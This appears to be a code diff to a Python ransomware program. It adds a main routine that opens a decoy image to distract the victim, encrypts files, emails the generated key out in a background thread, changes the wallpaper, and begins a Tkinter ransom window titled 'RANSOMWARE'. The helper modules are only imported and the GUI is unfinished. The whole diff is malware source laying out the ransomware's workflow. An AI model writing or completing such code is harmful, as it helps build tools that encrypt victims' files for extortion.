@@ -12,6 +12,11 @@ import subprocess
 
 import modules.cryptography
 import modules.send_email
+import modules.validate_input
+import modules.handle_wallpaper
+import modules.test_decryption_key
+import modules.check_connection
+from modules.normalize_path_name import normalize_path_name
 
 
 class Ransomware:
@@ -39,11 +44,26 @@ class Ransomware:
         self.starting_dir_test = starting_dir_test
 
     def main(self):
-        start = time.time()
+        # start = time.time()
 
+        self.open_fake_file()
 
-        stop = time.time()
-        print('Encryption made in {}'.format(round(stop - start, 3)))
+        generate_key = self.handle_key()
+
+        self.encrypt_files(generate_key['key'])
+
+        t = Thread(target=partial(self.handle_mail, generate_key, passwd))
+        t.daemon = True
+
+        t.start()
+
+        # stop = time.time()
+        # print('Encryption made in {}'.format(round(stop - start, 3)))
+
+        modules.handle_wallpaper.change_wallpaper()
+
+        gui = RansomGUI(os.path.expanduser('~'), generate_key)
+        gui.show_message()
 
 
     def gen_pass(self):
@@ -119,6 +139,21 @@ class Ransomware:
     def open_fake_file(self):
         subprocess.Popen(normalize_path_name(sys._MEIPASS, 'kali.jpg'), shell=True)
 
+
+class RansomGUI(Ransomware):
+
+    def __init__(self, starting_dir_test, key_input):
+        self.extensions_to_decrypt = ['encrypted']
+        self.key_input = key_input
+
+        Ransomware.__init__(self, starting_dir_test)
+
+
+    def show_message(self):
+        root = Tk()
+        root.title("RANSOMWARE")
+
+        
 
 if __name__ == '__main__':
     pass
